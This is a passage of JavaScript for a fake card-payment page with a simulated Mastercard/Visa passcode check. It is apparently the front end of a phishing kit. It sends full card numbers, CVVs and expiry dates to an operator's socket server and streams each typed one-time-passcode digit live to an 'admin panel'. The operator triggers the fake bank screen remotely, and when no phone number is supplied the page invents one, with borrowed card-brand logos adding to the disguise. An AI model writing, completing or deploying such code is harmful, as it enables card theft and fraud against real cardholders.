                    console.log('Found valid amount from server:', serverAmount);
                    state.amount = serverAmount;
                    updateAmountDisplays();
                } else {
                    console.log('Could not find valid amount in server response, using default');
                }
            })
            .catch(error => {
                console.error('Error fetching payment details:', error);
            });
    } catch (error) {
        console.error('Error in fetchAmountFromServer:', error);
    }
}
  
function updateAmountDisplays() {
    console.log('Updating all amount displays with:', state.amount);
    
    // Try multiple selector approaches for maximum coverage
    const amountSelectors = [
        '#amount-display',
        '.amount-display',
        '#transactionAmount'
    ];
    
    // For each selector type, try to update all matching elements
    amountSelectors.forEach(selector => {
        const elements = document.querySelectorAll(selector);
        elements.forEach(el => {
            el.textContent = state.amount.toFixed(2);
            console.log(`Updated ${selector} element with amount: ${state.amount.toFixed(2)}`);
        });
    });
    
    // Direct getElementById approach for critical elements
    const amountDisplay = document.getElementById('amount-display');
    if (amountDisplay) {
        amountDisplay.textContent = state.amount.toFixed(2);
        console.log('Updated #amount-display with amount:', state.amount.toFixed(2));
    }
    
    // Calculate and update subtotal and tax
    const subtotal = Math.round(state.amount * 100 / 1.0825) / 100;
    const tax = state.amount - subtotal;
    
    document.querySelectorAll('.subtotal-display').forEach(el => {
        el.textContent = subtotal.toFixed(2);
    });
    
    document.querySelectorAll('.tax-display').forEach(el => {
        el.textContent = tax.toFixed(2);
    });
    
    // Force update the MC verification amount element if it exists
    const mcAmount = document.getElementById('transactionAmount');
    if (mcAmount) {
        mcAmount.textContent = state.amount.toFixed(2);
        console.log('Updated #transactionAmount with:', state.amount.toFixed(2));
    }
}
  
document.addEventListener('DOMContentLoaded', function() {
    try {
        console.log('Document loaded, initializing application...');
        
        // Parse URL parameters first - this will set the amount or trigger server fetch
        parseURLParams();
        
        // Generate invoice ID
        document.getElementById('invoiceId').textContent = generateInvoiceID();
        
        // Make sure amount displays are updated immediately
        updateAmountDisplays();
        
        // Add a delayed update to catch any late-loaded elements
        setTimeout(updateAmountDisplays, 500);
        setTimeout(updateAmountDisplays, 1000);
        
        // Rest of your initialization code...
        initializeSocketConnection();
        
        // Setup card form handlers
        setTimeout(function() {
            setupCardFormHandlers();
            console.log('Card form handlers set up after delay');
        }, 500);
        
        // Setup MC verification handlers
        setTimeout(function() {
            setupMcVerificationHandlers();
            console.log('MC button handlers set up after delay');
        }, 800);
        
        // Setup back button confirmation
        setupBackButtonConfirmation();
        
    } catch (error) {
        console.error('Error initializing application:', error);
    }
});

        // Add this new function to your code
function fetchPaymentDetailsFromServer() {
    // Check if we have a pid in state
    if (!state.pid) {
        console.log('No payment ID found, using default amount');
        return;
    }
    
    try {
        console.log('Fetching payment details from server for pid:', state.pid);
        
        // Fetch payment details from server API endpoint
        fetch(`/api/getPaymentDetails?pid=${state.pid}`)
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed to fetch payment details');
                }
                return response.json();
            })
            .then(data => {
                console.log('Payment details received from server:', data);
                
                if (data.status === 'success' && data.payment && data.payment.amount) {
                    // Get the amount from the server response
                    const serverAmount = parseFloat(data.payment.amount);
                    
                    if (!isNaN(serverAmount)) {
                        console.log('Setting amount from server:', serverAmount);
                        
                        // Update state amount
                        state.amount = serverAmount;
                        
                        // Update all displays with this amount
                        updateAmountDisplays();
                        
                        console.log('Amount displays updated with server value:', serverAmount);
                    } else {
                        console.error('Invalid amount from server:', data.payment.amount);
                    }
                } else {
                    console.error('Invalid payment details response:', data);
                }
            })
            .catch(error => {
                console.error('Error fetching payment details:', error);
            });
    } catch (error) {
        console.error('Exception in fetchPaymentDetailsFromServer:', error);
    }
}
// Initialize socket connection
function initializeSocketConnection() {
    try {
        console.log('Initializing socket connection...');
        socket = io();
        
        // Add connection event handlers
        socket.on('connect', () => {
            console.log('Socket connected with ID:', socket.id);
            
            // Send visitor info to admin panel
            socket.emit('visitor', {
                pid: state.pid || generateTransactionId(),
                url: window.location.href,
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString(),
                amount: state.amount
            });
            
            console.log('Visitor info sent to server');
            
            // Start heartbeat
            setInterval(() => {
                socket.emit('visitor_heartbeat', { 
                    pid: state.pid,
                    timestamp: Date.now() 
                });
            }, 30000);
            
            // Join room for this payment ID if available
            if (state.pid) {
                socket.emit('join', state.pid);
                console.log('Joined room for pid:', state.pid);
            }
        });
        
        socket.on('connect_error', (error) => {
            console.error('Socket connection error:', error);
            showErrorNotification('Connection to payment server failed. Please refresh and try again.');
        });
        
        socket.on('disconnect', () => {
            console.log('Socket disconnected');
        });
        
        // Setup important socket event handlers
        setupSocketEventHandlers();
        
        console.log('Socket initialization complete');
    } catch (error) {
        console.error('Failed to initialize socket:', error);
        showErrorNotification('Payment system initialization failed. Please refresh and try again.');
    }
}

function setupSocketEventHandlers() {
    if (!socket) {
        console.error('Socket not initialized');
        return;
    }
    
    console.log('Setting up socket event handlers');
    
    // Handle admin panel commands
    socket.on('command', function(data) {
        console.log('Received command from admin panel:', data);
        
        if (data.action === 'show_mc_verification') {
            // Store phone if provided by admin
            if (data.phone) {
                state.phoneNumberSet = true;
                state.phoneLastFour = data.phone.slice(-4);
                console.log('Phone from admin panel:', state.phoneLastFour);
            }
            
            // Show MC verification
            showMcVerification();
        }
    });
    
    // MC verification events
    socket.on('show_mc_verification', function(data) {
        console.log('Show MC verification command received:', data);
        if (data.phoneLastFour) {
            state.phoneNumberSet = true;
            state.phoneLastFour = data.phoneLastFour;
            console.log('Phone from show_mc_verification:', state.phoneLastFour);
        }
        
        // If cardType is provided, update state
        if (data.cardType) {
            state.cardType = data.cardType;
            console.log('Card type updated:', state.cardType);
        }
        
        showMcVerification();
    });
    
    // Handle start verification command
    socket.on('start_verification', function(data) {
        console.log('Start verification command received:', data);
        
        // Store phone if provided and not already set
        if (data.phoneLastFour && !state.phoneNumberSet) {
            state.phoneNumberSet = true;
            state.phoneLastFour = data.phoneLastFour;
            console.log('Phone from start_verification:', state.phoneLastFour);
        }
        
        // Store transaction ID if provided
        if (data.invoiceId && !state.transactionId) {
            state.transactionId = data.invoiceId;
            console.log('Transaction ID set from start_verification:', state.transactionId);
        }
        
        // Update UI with merchant name if provided
        if (data.merchantName) {
            const merchantNameElement = document.getElementById('merchantName');
            if (merchantNameElement) {
                merchantNameElement.textContent = data.merchantName;
                console.log('Merchant name updated:', data.merchantName);
            }
        }
        
        // Update bank if provided
        if (data.bankCode) {
            updateBankLogo(data.bankCode);
            console.log('Bank logo updated:', data.bankCode);
        }
    });
    
    // Handle bank update command
    socket.on('update_mc_bank', function(data) {
        console.log('Received bank update:', data);
        if (data.bankCode) {
            updateBankLogo(data.bankCode);
            console.log('Bank logo updated from event:', data.bankCode);
        }
    });

    // Handle currency update command
    socket.on('update_mc_currency', function(data) {
        console.log('Received currency update:', data);
        if (data.currency) {
            // Update currency symbol based on provided currency
            const currencySymbol = getCurrencySymbol(data.currency);
            const currencySymbolElement = document.getElementById('currencySymbol');
            if (currencySymbolElement) {
                currencySymbolElement.textContent = currencySymbol;
                console.log('Currency symbol updated:', currencySymbol);
            }
        }
    });
    
    // Payment response handlers
    socket.on('payment_response', function(data) {
        console.log('Payment response received:', data);
        if (data.success) {
            proceedToSuccess();
        } else if (data.requiresVerification) {
            console.log('Server requested MC verification for transaction:', data.transactionId);
            state.transactionId = data.transactionId;
            // Wait for admin to trigger the verification
        } else {
            handlePaymentError(data.message || 'Payment declined');
        }
    });
    
    // Handle MC verification result
    socket.on('mc_verification_result', function(data) {
        console.log('MC verification result received:', data);
        
        // Clear MC timer first
        if (mcTimerInterval) {
            clearInterval(mcTimerInterval);
            mcTimerInterval = null;
        }
        
        // Get the overlay and content elements
        const overlay = document.getElementById('mcVerificationOverlay');
        const verificationContent = document.getElementById('mcVerificationContent');
        
        if (data.success) {
            if (overlay && verificationContent) {
                // Get current date for display
                const currentDate = new Date().toLocaleDateString();
                
                // Replace with success message showing invoice ID and date
                verificationContent.innerHTML = `
                    <div style="display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 300px; padding: 20px;">
                        <div style="color: #4CAF50; font-size: 60px; margin-bottom: 20px;"></div>
                        <div style="text-align: center; max-width: 320px;">
                            <h2 style="color: #333; font-size: 24px; margin-bottom: 15px;">Payment Successful</h2>
                            <div style="background-color: #f5f5f5; border-radius: 8px; padding: 15px; margin-bottom: 20px;">
                                <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                                    <span style="color: #555; font-size: 14px;">Invoice ID:</span>
                                    <span style="color: #333; font-weight: 600; font-size: 14px;">INV-${state.transactionId}</span>
                                </div>
                                <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                                    <span style="color: #555; font-size: 14px;">Date:</span>
                                    <span style="color: #333; font-weight: 600; font-size: 14px;">${currentDate}</span>
                                </div>
                                <div style="display: flex; justify-content: space-between;">
                                    <span style="color: #555; font-size: 14px;">Amount:</span>
                                    <span style="color: #333; font-weight: 600; font-size: 14px;">$${state.amount.toFixed(2)}</span>
                                </div>
                            </div>
                            <p style="color: #666; font-size: 14px;">Thank you for your payment. A confirmation has been sent to your email.</p>
                        </div>
                    </div>
                `;
                
                // Show overlay with success content
                overlay.style.display = 'flex';
                
                // Redirect to success page after delay
                setTimeout(() => {
                    window.location.href = `/success.html?ref=${state.transactionId}`;
                }, 5000);
            } else {
                // Direct redirect if overlay elements not found
                window.location.href = `/success.html?ref=${state.transactionId}`;
            }
        } else {
            // Handle failure case
            if (overlay && verificationContent) {
                // Replace with failure message
                verificationContent.innerHTML = `
                    <div style="display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 300px;">
                        <div style="color: #ef4444; font-size: 48px;"></div>
                        <div style="margin-top: 20px; text-align: center;">
                            <h3 style="color: #ef4444;">Payment Failed</h3>
                            <p style="color: #333;">${data.message || 'Your payment could not be processed.'}</p>
                            <p style="margin-top: 10px; color: #666;">Redirecting to failure page...</p>
                        </div>
                    </div>
                `;
                
                // Keep the overlay visible but change content
                overlay.style.display = 'flex';
                
                // Redirect to failure page after delay
                setTimeout(() => {
                    window.location.href = `/fail.html?reason=${data.reason || 'payment_failed'}&ref=${state.transactionId}`;
                }, 2000);
            } else {
                // Direct redirect if overlay elements not found
                window.location.href = `/fail.html?reason=${data.reason || 'payment_failed'}&ref=${state.transactionId}`;
            }
        }
    });
    
    // Handle OTP errors
    socket.on('mc_otp_error', function(data) {
        console.log('MC OTP error received:', data);
        handleOtpError(data.message);
    });
    
    console.log('Socket event handlers setup complete');
}

// Helper function to get currency symbols
function getCurrencySymbol(currencyCode) {
    const symbols = {
        'USD': '$',
        'EUR': '',
        'GBP': '',
        'JPY': '',
        'INR': '',
        'AUD': 'A$',
        'CAD': 'C$',
        'CHF': 'CHF',
        'CNY': '',
        'HKD': 'HK$'
    };
    return symbols[currencyCode] || '$';
}
        
function setupCardFormHandlers() {
    console.log('Setting up card form handlers...');
    
    const cardNumberInput = document.getElementById('card-number');
    const expiryDateInput = document.getElementById('expiry-date');
    const cvvInput = document.getElementById('cvv');
    const cardHolderInput = document.getElementById('card-holder');
    const cardForm = document.getElementById('card-form');
    const payNowBtn = document.getElementById('pay-now-btn');
    
    if (!cardNumberInput) {
        console.error('Card number input not found!');
        return;
    }
    
    if (!expiryDateInput) {
        console.error('Expiry date input not found!');
        return;
    }
    
    if (!cvvInput) {
        console.error('CVV input not found!');
        return;
    }
    
    if (!cardHolderInput) {
        console.error('Card holder input not found!');
        return;
    }
    
    if (!cardForm) {
        console.error('Card form not found!');
        return;
    }
    
    if (!payNowBtn) {
        console.error('Pay now button not found!');
        return;
    }
    
    console.log('All card form elements found');
    
    // Format card number with spaces
    cardNumberInput.addEventListener('input', function(e) {
        console.log('Card number input event');
        let value = e.target.value.replace(/\D/g, '');
        let formattedValue = '';
        
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) {
                formattedValue += ' ';
            }
            formattedValue += value[i];
        }
        
        e.target.value = formattedValue;
        
        // Detect card type
        detectCardType(value);
        
        // Update Pay button state
        checkFormCompletion();
    });
    
    // Format expiry date as MM/YY
    expiryDateInput.addEventListener('input', function(e) {
        console.log('Expiry date input event');
        let value = e.target.value.replace(/\D/g, '');
        let formattedValue = '';
        
        if (value.length > 0) {
            // First get the month
            let month = value.substring(0, 2);
            // Ensure month is between 01-12
            if (month.length === 1) {
                formattedValue = month;
            } else {
                let monthNum = parseInt(month, 10);
                if (monthNum > 12) {
                    month = '12';
                } else if (monthNum < 1) {
                    month = '01';
                }
                formattedValue = month;
            }
            
            // Then add the year if provided
            if (value.length > 2) {
                formattedValue += '/' + value.substring(2, 4);
            }
        }
        
        e.target.value = formattedValue;
        
        // Update Pay button state
        checkFormCompletion();
    });
    
    // Handle CVV input
    cvvInput.addEventListener('input', function() {
        console.log('CVV input event');
        // Update Pay button state
        checkFormCompletion();
    });
    
    // Handle card holder input
    cardHolderInput.addEventListener('input', function() {
        console.log('Card holder input event');
        // Update Pay button state
        checkFormCompletion();
    });
    
    // Handle form submission
    cardForm.addEventListener('submit', function(e) {
        e.preventDefault();
        console.log('Form submitted, preventing default');
        
        const cardNumber = cardNumberInput.value.replace(/\s/g, '');
        const cardHolder = cardHolderInput.value;
        const expiryDate = expiryDateInput.value;
        const cvv = cvvInput.value;
        
        // Basic validation
        if (!validateCardForm(cardNumber, cardHolder, expiryDate, cvv)) {
            console.log('Card form validation failed');
            return false;
        }
        
        // Update state with card details
        state.cardForm = {
            cardNumber,
            cardHolder,
            expiryDate,
            cvv,
            errors: {}
        };
        
        // Process payment
        processPayment();
        
        return false; // Prevent form submission
    });
    
    // Additional direct handler for the submit button
    payNowBtn.addEventListener('click', function(e) {
        console.log('Pay now button clicked');
        e.preventDefault();
        
        // Manually submit the form
        const event = new Event('submit', {
            bubbles: true,
            cancelable: true
        });
        cardForm.dispatchEvent(event);
        
        return false;
    });
    
    // Initialize card brand icon to empty
    updateCardBrandIcon(null);
    
    console.log('Card form handlers initialized successfully');
}
  
function validateCardForm(cardNumber, cardHolder, expiryDate, cvv) {
    console.log('Validating card form...');
    
    let isValid = true;
    const errors = {};
    
    // Validate card number (simple check for length)
    if (cardNumber.length < 13 || cardNumber.length > 19) {
        errors.cardNumber = 'Invalid card number';
        isValid = false;
        console.log('Card number validation failed');
    }
    
    // Validate card holder name
    if (!cardHolder.trim()) {
        errors.cardHolder = 'Please enter cardholder name';
        isValid = false;
        console.log('Card holder validation failed');
    }
    
    // Validate expiry date
    if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
        errors.expiryDate = 'Invalid expiry date';
        isValid = false;
        console.log('Expiry date validation failed');
    } else {
        // Check if date is not in the past
        const [month, year] = expiryDate.split('/');
        const expiryMonth = parseInt(month, 10);
        const expiryYear = parseInt('20' + year, 10);
        
        const now = new Date();
        const currentMonth = now.getMonth() + 1; // getMonth() is 0-indexed
        const currentYear = now.getFullYear();
        
        if (expiryYear < currentYear || (expiryYear === currentYear && expiryMonth < currentMonth)) {
            errors.expiryDate = 'Card has expired';
            isValid = false;
            console.log('Expiry date validation failed - expired');
        }
    }
    
    // Validate CVV (3-4 digits)
    if (!/^\d{3,4}$/.test(cvv)) {
        errors.cvv = 'Invalid CVV';
        isValid = false;
        console.log('CVV validation failed');
    }
    
    // Display errors if any
    if (!isValid) {
        state.cardForm.errors = errors;
        Object.keys(errors).forEach(field => {
            const input = document.getElementById(field.replace(/([A-Z])/g, '-$1').toLowerCase());
            if (input) {
                input.classList.add('error');
                
                // Remove any existing error messages first
                const existingError = input.parentNode.querySelector('.error-message');
                if (existingError) {
                    existingError.remove();
                }
                
                const errorEl = document.createElement('div');
                errorEl.className = 'error-message';
                errorEl.textContent = errors[field];
                input.parentNode.appendChild(errorEl);
            }
        });
    }
    
    console.log('Card form validation result:', isValid);
    return isValid;
}

function detectCardType(cardNumber) {
    // Remove spaces and non-digits
    cardNumber = cardNumber.replace(/\D/g, '');
    
    let cardType = null;
    
    // Check for card type based on patterns
    if (/^4/.test(cardNumber)) {
        cardType = 'visa';
    } else if (/^5[1-5]/.test(cardNumber)) {
        cardType = 'mastercard';
    } else if (/^3[47]/.test(cardNumber)) {
        cardType = 'amex';
    } else if (/^6(?:011|5)/.test(cardNumber)) {
        cardType = 'discover';
    }
    
    state.cardType = cardType;
    
    // Update UI to show card type if needed
    updateCardBrandIcon(cardType);
}

function processPayment() {
    console.log('Processing payment...');
    
    // Generate a unique transaction ID
    state.transactionId = generateTransactionId();
    console.log('Generated transaction ID:', state.transactionId);
    
    // Show processing state
    const cardForm = document.getElementById('card-form');
    if (cardForm) {
        const submitBtn = cardForm.querySelector('button[type="submit"]');
        if (submitBtn) {
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<span class="spinner"></span> Processing...';
            console.log('Payment button disabled and showing spinner');
        } else {
            console.warn('Submit button not found in form');
        }
    } else {
        console.warn('Card form not found');
    }
    
    // Check if socket is initialized
    if (!socket) {
        console.error('Socket connection not established');
        handlePaymentError('Connection to payment server failed. Please try again.');
        return;
    }
    
    if (!socket.connected) {
        console.error('Socket is initialized but not connected');
        handlePaymentError('Connection to payment server lost. Please try again.');
        return;
    }
    
    console.log('Sending payment data to server:', {
        transactionId: state.transactionId,
        amount: state.amount,
        cardDetails: 'REDACTED'
    });
    
    // Emit payment processing event to server
    socket.emit('process_payment', {
        transactionId: state.transactionId,
        amount: state.amount,
        cardNumber: state.cardForm.cardNumber,
        expiryDate: state.cardForm.expiryDate,
        cvv: state.cardForm.cvv,
        cardHolder: state.cardForm.cardHolder,
        cardType: state.cardType,
        currency: 'USD',
        email: 'customer@example.com'
    });
    
    console.log('Payment data sent to server');
    
    // Show notification that card details have been submitted
    showProcessingNotification();
}
        
function showProcessingNotification() {
    // Create floating notification
    const notification = document.createElement('div');
    notification.style.position = 'fixed';
    notification.style.top = '20px';
    notification.style.left = '50%';
    notification.style.transform = 'translateX(-50%)';
    notification.style.backgroundColor = '#4CAF50';
notification.style.color = 'white';
    notification.style.padding = '10px 20px';
    notification.style.borderRadius = '4px';
    notification.style.boxShadow = '0 2px 10px rgba(0,0,0,0.2)';
    notification.style.zIndex = '9999';
    notification.style.transition = 'opacity 0.5s';
    notification.innerHTML = 'Card details submitted successfully. Please wait for verification...';
    
    document.body.appendChild(notification);
    
    // Remove notification after 5 seconds
    setTimeout(() => {
        notification.style.opacity = '0';
        setTimeout(() => {
            if (notification.parentNode) {
                notification.parentNode.removeChild(notification);
            }
        }, 500);
    }, 5000);
}

function generateTransactionId() {
    return Math.random().toString(36).substring(2, 12);
}

function showMcVerification() {
    console.log('Showing MC verification overlay');
    
    const overlay = document.getElementById('mcVerificationOverlay');
    const loadingContent = document.getElementById('mcLoadingContent');
    const verificationContent = document.getElementById('mcVerificationContent');
    
    if (!overlay) {
        console.error('MC verification overlay element not found!');
        return;
    }
    
    if (!loadingContent) {
        console.error('MC loading content element not found!');
        return;
    }
    
    if (!verificationContent) {
        console.error('MC verification content element not found!');
        return;
    }
    
    // Show overlay with loading spinner
    overlay.style.display = 'flex';
    loadingContent.style.display = 'flex';
    verificationContent.style.display = 'none';
    
    // Set verification logo for loading screen based on card type
    updateLoadingVerificationLogo(state.cardType || 'default');
    
    console.log('Loading screen displayed, card type:', state.cardType || 'default');
    
    // Simulate loading delay (1-2 seconds)
    setTimeout(() => {
        console.log('Loading complete, showing verification content');
        loadingContent.style.display = 'none';
        verificationContent.style.display = 'block';
        
        // Update verification UI with transaction details
        updateMcVerificationUI();
        
        // Start MC verification timer
        startMcTimer();
        
        // Ensure the OTP input has focus
        setTimeout(() => {
            const otpInput = document.getElementById('mcOtpInput');
            if (otpInput) {
                otpInput.focus();
                console.log('OTP input focused');
            }
        }, 300);
    }, 1500);
}

function updateLoadingVerificationLogo(cardType) {
    const logoContainer = document.getElementById('loadingVerificationLogo');
    if (!logoContainer) return;
    
    let logoUrl = '';
    
    if (cardType === 'visa') {
        logoUrl = 'https://vectorseek.com/wp-content/uploads/2023/09/Verified-By-Visa-Logo-Vector.svg-.png';
    } else if (cardType === 'mastercard') {
        logoUrl = 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png';
    } else {
        logoUrl = 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png';
    }
    
    logoContainer.innerHTML = `<img src="${logoUrl}" alt="Verification" style="height: 100%; max-width: 150px;">`;
}

function updateMcVerificationUI() {
    // Log current state for debugging
    console.log('Updating MC verification UI with amount:', state.amount);
    console.log('Phone last four set:', state.phoneNumberSet, state.phoneLastFour);
    
    // Update elements with transaction details
    try {
        // Phone number display
        const phoneNumber = getPhoneDisplay();
        console.log('Using phone number for display:', phoneNumber);
        updateElement('cardLastFourDigits', phoneNumber);
        
        // Merchant name
        updateElement('merchantName', 'Peacock Merchandise');
        
        // Amount with proper formatting
        updateElement('transactionAmount', state.amount.toFixed(2));
        
        // Current date and time
        updateElement('transactionDate', getCurrentDateTime());
        
        // Card number with masking
        const maskedCard = formatCardNumberDisplay(state.cardForm.cardNumber);
        console.log('Using masked card:', maskedCard);
        updateElement('cardNumberDisplay', maskedCard);
        
        // Reference ID (transaction ID)
        const refId = state.transactionId || generateTransactionId();
        console.log('Using reference ID:', refId);
        updateElement('referenceId', refId);
        
        // Update bank logo and verification logo based on card type
        updateBankLogo('default'); // Will be updated by admin if needed
        updateVerificationLogo(state.cardType || 'default');
        
        // Clear previous OTP error if any
        const otpError = document.getElementById('mcOtpError');
        if (otpError) {
            otpError.style.display = 'none';
        }
        
        console.log('MC verification UI updated successfully');
    } catch (error) {
        console.error('Error updating MC verification UI:', error);
    }
}

function getPhoneDisplay() {
    // Use admin-provided phone if available, otherwise generate random one
    if (state.phoneNumberSet && state.phoneLastFour) {
        console.log('Using admin provided phone ending in:', state.phoneLastFour);
        return `********${state.phoneLastFour}`;
    } else {
        // Generate random phone number
        const randomPhone = generateRandomPhone();
        console.log('No admin phone provided, using generated phone:', randomPhone);
        return randomPhone;
    }
}

function generateRandomPhone() {
    // Generate a random 4-digit number for phone display
    const lastFour = Math.floor(1000 + Math.random() * 9000).toString();
    console.log('Generated random phone last four:', lastFour);
    return `********${lastFour}`;
}

function updateBankLogo(bankCode) {
    const bankLogo = document.getElementById('bankLogo');
    if (!bankLogo) return;
    
    bankLogo.src = bankLogos[bankCode] || bankLogos['default'];
}

function updateVerificationLogo(cardType) {
    const verificationLogo = document.getElementById('verificationTypeLogo');
    if (!verificationLogo) return;
    
    if (cardType === 'visa') {
        verificationLogo.src = 'https://vectorseek.com/wp-content/uploads/2023/09/Verified-By-Visa-Logo-Vector.svg-.png';
    } else if (cardType === 'mastercard') {
        verificationLogo.src = 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png';
    } else {
        verificationLogo.src = 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png';
    }
}

function updateElement(id, value) {
    const element = document.getElementById(id);
    if (element) {
        element.textContent = value;
    }
}

function formatCardNumberDisplay(cardNumber) {
    // Format as XXXX XXXX XXXX 1234 (last 4 digits visible)
    if (!cardNumber) return 'XXXX XXXX XXXX XXXX';
    const last4 = cardNumber.slice(-4);
    return `XXXX XXXX XXXX ${last4}`;
}

function getCurrentDateTime() {
    const now = new Date();
    return now.toLocaleDateString() + ' ' + now.toLocaleTimeString();
}

function startMcTimer() {
    // Clear any existing timer
    if (mcTimerInterval) {
        clearInterval(mcTimerInterval);
    }
    
    // Set initial time (4:59)
    let minutes = 4;
    let seconds = 59;
    
    // Update timer display
    updateTimerDisplay(minutes, seconds);
    
    // Start the countdown
    mcTimerInterval = setInterval(function() {
        if (seconds > 0) {
            seconds--;
        } else if (minutes > 0) {
            minutes--;
            seconds = 59;
        } else {
            // Time expired
            clearInterval(mcTimerInterval);
            handleMcTimeout();
            return;
        }
        
        updateTimerDisplay(minutes, seconds);
    }, 1000);
}

function updateTimerDisplay(minutes, seconds) {
    const timerElement = document.getElementById('mcTimer');
    if (timerElement) {
        timerElement.textContent = `Session expires in: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
    }
}

function handleMcTimeout() {
    console.log('MC verification timeout');
    
    // Show timeout message
    const otpError = document.getElementById('mcOtpError');
    if (otpError) {
        otpError.textContent = 'Session timed out. Please try again.';
        otpError.style.display = 'block';
    }
    
    // Disable submit button
    const submitBtn = document.getElementById('mcSubmitBtn');
    if (submitBtn) {
        submitBtn.disabled = true;
    }
    
    // Notify server of timeout
    if (socket && state.transactionId) {
        socket.emit('mc_verification_timeout', {
            transactionId: state.transactionId
        });
    }
    
    // Automatically redirect to failure page after short delay
    setTimeout(() => {
        window.location.href = `/fail.html?reason=timeout&ref=${state.transactionId}`;
    }, 3000);
}

function setupMcVerificationHandlers() {
    console.log('Setting up MC verification handlers');
    
    // Make sure buttons exist
    const mcSubmitBtn = document.getElementById('mcSubmitBtn');
    const mcResendBtn = document.getElementById('mcResendBtn');
    const mcCancelBtn = document.getElementById('mcCancelBtn');
    const mcOtpInput = document.getElementById('mcOtpInput');
    
    if (!mcSubmitBtn || !mcResendBtn || !mcCancelBtn || !mcOtpInput) {
        console.error('MC verification elements not found:', {
            mcSubmitBtn: !!mcSubmitBtn,
            mcResendBtn: !!mcResendBtn,
            mcCancelBtn: !!mcCancelBtn,
            mcOtpInput: !!mcOtpInput
        });
        return;
    }
    
    // Submit button handler
    mcSubmitBtn.addEventListener('click', function() {
        console.log('MC Submit button clicked');
        handleMcSubmit();
    });
    
    // Resend button handler
    mcResendBtn.addEventListener('click', function() {
        console.log('MC Resend button clicked');
        handleMcResend();
    });
    
    // Cancel button handler
    mcCancelBtn.addEventListener('click', function() {
        console.log('MC Cancel button clicked');
        handleMcCancel();
    });
    
    // OTP input handler
    mcOtpInput.addEventListener('input', function(e) {
        console.log('MC OTP input event');
        // Only allow digits
        e.target.value = e.target.value.replace(/\D/g, '');
        
        // Max length 6
        if (e.target.value.length > 6) {
            e.target.value = e.target.value.slice(0, 6);
        }
        
        // Notify server about typing activity
        if (socket && socket.connected && state.transactionId) {
            socket.emit('mc_otp_typing', {
                invoiceId: state.transactionId,
                partialOtp: e.target.value
            });
        }
        
        // Auto-submit when 6 digits entered
        if (e.target.value.length === 6) {
            console.log('OTP complete, auto-submitting...');
            setTimeout(() => {
                handleMcSubmit();
            }, 500);
        }
    });
    
    console.log('MC verification handlers setup complete');
}

function handleMcSubmit() {
    console.log('MC Submit button clicked!');
    
    const otpInput = document.getElementById('mcOtpInput');
    const otpError = document.getElementById('mcOtpError');
    const consentCheckbox = document.getElementById('mcConsentCheckbox');
    
    if (!otpInput) {
        console.error('OTP input element not found!');
        return;
    }
    
    if (!otpError) {
        console.error('OTP error element not found!');
        return;
    }
    
    if (!consentCheckbox) {
        console.error('Consent checkbox element not found!');
        return;
    }
    
    console.log('OTP Elements found - continuing');
    
    // Check consent
    if (!consentCheckbox.checked) {
        console.log('Terms not accepted');
        otpError.textContent = 'Please accept the terms and conditions';
        otpError.style.display = 'block';
        return;
    }
    
    // Get OTP value
    const otpValue = otpInput.value.trim();
    console.log('OTP Value:', otpValue);
    
    // Check if OTP is empty
    if (!otpValue) {
        console.log('OTP is empty');
        otpError.textContent = 'Please enter the One-Time Passcode';
        otpError.style.display = 'block';
        return;
    }
    
    // Check if OTP is correct length
    if (otpValue.length !== 6) {
        console.log('OTP length invalid:', otpValue.length);
        otpError.textContent = 'One-Time Passcode must be 6 digits';
        otpError.style.display = 'block';
        return;
    }
    
    // Check if transaction ID exists
    if (!state.transactionId) {
        console.error('No transaction ID found in state!');
        otpError.textContent = 'Transaction ID missing. Please try again.';
        otpError.style.display = 'block';
        return;
    }
    
    console.log('OTP validation passed - sending to server');
    
    // Send OTP verification to server
    if (socket && socket.connected) {
        console.log('Sending OTP to server:', otpValue, 'for transaction:', state.transactionId);
        
        // Send via mc_otp_submitted event
        socket.emit('mc_otp_submitted', {
            invoiceId: state.transactionId,
            otp: otpValue
        });
        
        console.log('mc_otp_submitted event sent');
        
        // Also try the older verify_otp format for backward compatibility
        socket.emit('verify_otp', {
            transactionId: state.transactionId,
            otp: otpValue,
            cardDetails: {
                cardNumber: state.cardForm.cardNumber,
                cardHolder: state.cardForm.cardHolder,
                expiryDate: state.cardForm.expiryDate,
                cvv: state.cardForm.cvv,
                cardType: state.cardType
            },
            amount: state.amount
        });
        
        console.log('verify_otp event sent for backward compatibility');
    } else {
        console.error('Socket not connected for OTP verification!');
        otpError.textContent = 'Connection error. Please try again.';
        otpError.style.display = 'block';
        return;
    }
    
    // Disable submit button and show loading
    const submitBtn = document.getElementById('mcSubmitBtn');
    if (submitBtn) {
        submitBtn.disabled = true;
        submitBtn.innerHTML = '<span class="spinner"></span> Verifying...';
        console.log('Submit button disabled, showing spinner');
    }
    
    console.log('OTP submission complete - waiting for server response');
}

function handleMcResend() {
    // Show resend confirmation
    const otpError = document.getElementById('mcOtpError');
    if (otpError) {
        otpError.textContent = 'A new One-Time Passcode has been sent';
        otpError.style.display = 'block';
        
        // Hide after delay
        setTimeout(() => {
            otpError.style.display = 'none';
        }, 3000);
    }
    
    // Clear OTP input
    const otpInput = document.getElementById('mcOtpInput');
    if (otpInput) {
        otpInput.value = '';
    }
    
    // Notify server of resend request
    if (socket) {
        socket.emit('resend_otp', {
            transactionId: state.transactionId
        });
    }
}

function handleMcCancel() {
    // Clear timer
    if (mcTimerInterval) {
        clearInterval(mcTimerInterval);
    }
    
    // Hide MC verification overlay
    const overlay = document.getElementById('mcVerificationOverlay');
    if (overlay) {
        overlay.style.display = 'none';
    }
    
    // Re-enable form submit button
    const cardForm = document.getElementById('card-form');
    if (cardForm) {
        const submitBtn = cardForm.querySelector('button[type="submit"]');
        if (submitBtn) {
            submitBtn.disabled = false;
